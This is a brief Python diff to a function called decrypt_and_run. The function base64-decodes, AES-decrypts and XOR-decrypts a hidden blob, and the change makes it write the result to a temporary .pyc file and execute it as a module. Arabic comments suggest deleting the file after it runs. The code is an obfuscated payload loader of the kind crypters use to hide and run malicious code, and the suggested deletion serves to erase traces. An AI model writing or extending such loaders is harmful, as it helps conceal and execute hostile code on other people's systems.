@@ -1,4 +1,6 @@
 import base64
+import tempfile
+import importlib.util
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 
@@ -18,4 +20,14 @@ def decrypt_and_run(data_b64: str, aes_key: bytes, iv: bytes, xor_key: bytes, mo
             data = unpad(cipher.decrypt(data), AES.block_size)
             data = xor_decrypt(data, xor_key)
 
-    exec(data, globals())
+    # حفظ الملف وتشغيله كـ .pyc
+    with tempfile.NamedTemporaryFile(delete=False, suffix=".pyc") as f:
+        f.write(data)
+        temp_path = f.name
+
+    spec = importlib.util.spec_from_file_location("x", temp_path)
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+
+    # يمكنك حذف الملف بعد التشغيل:
+    # os.unlink(temp_path)
